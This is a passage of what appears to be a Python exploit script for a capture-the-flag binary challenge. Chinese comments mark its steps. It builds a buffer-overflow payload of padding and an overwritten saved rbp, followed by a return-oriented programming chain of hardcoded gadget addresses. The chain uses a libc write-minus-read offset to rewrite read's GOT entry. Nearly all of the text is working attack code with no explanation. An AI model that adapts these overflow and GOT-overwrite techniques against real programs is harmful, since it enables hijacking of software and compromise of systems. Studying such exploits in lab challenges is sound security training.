...
payload = b"A" * 0x40
payload += p64(0xaaaaaaaa) # 覆盖rbp
payload += p64(pop_all)  # 清空一切
diff = libc.sym['write'] - libc.sym['read']
print(diff & 0xffffffffffffffff)
payload += p64(diff & 0xffffffffffffffff) # 对齐
payload += p64(0x0601020 + 0x3d)  # write to got of read
payload += b"\x00" * 8 * 4
payload += p64(0x00000000004005d8) # pop rbp
payload += p64(0x00000000004006e3) # ret
payload += p64(1) 
payload += p64(0x00000000004006e1) # pop r15
